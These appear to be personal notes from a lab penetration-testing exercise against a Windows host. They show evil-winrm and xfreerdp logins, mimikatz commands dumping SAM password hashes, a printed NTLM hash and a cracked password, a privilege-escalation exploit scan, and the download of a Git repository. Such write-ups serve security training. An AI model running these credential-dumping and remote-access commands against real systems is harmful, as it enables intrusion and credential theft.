From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).

Adding new user and giving Admin privileges
![[Screenshot 2021-04-13 at 7.21.04 PM.png]]

Using evil-winrm for stable shell and as post exploitation

`evil-winrm -u sp00f -p "paSSword" -i 10.200.109.150`

![[Screenshot 2021-04-13 at 7.24.09 PM.png]]

using xfreerdp to get the hashes of the admin
`xfreerdp /v:10.200.109.150 /u:sp00f /p:paSSword /drive:/usr/share/windows-resources,share`


![[Screenshot 2021-04-13 at 7.58.27 PM.png]]
![[Screenshot 2021-04-13 at 7.58.47 PM.png]]

Running the mimikatz binary to get escalate the privileges as we still cant get the hashes
`\\tsclient\share\mimikatz\x64\mimikatz.exe`

Running
`privilege::debug`
`oken::elevate`

and `lsadump::sam` to get the dump
![[Screenshot 2021-04-13 at 8.02.03 PM.png]]


```
RID  : 000001f4 (500)                                                                                                   User : Administrator                                                                                                      Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1      
```

```
hash

thmomas 02d90eda8f6b6b06c32d5f207831101f 
passwd: i<3ruby
```

![[Screenshot 2021-04-13 at 8.57.08 PM.png]]


-----

### Using Powershell 

After getting the reverse shell back as the agents we will now use listeners

![[Screenshot 2021-04-30 at 6.52.45 PM.png]]

running Execute
```
Job started: C965SY



Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

----

Using Evil-WinRM, let look for the directory of source control

`GitStack_2.3.10.exe`

![[Screenshot 2021-04-30 at 9.43.28 PM.png]]

git source control is in `C:\GitStack\repositories\Website.git`
![[Screenshot 2021-04-30 at 9.46.43 PM.png]]

downloading using `download Website.git`
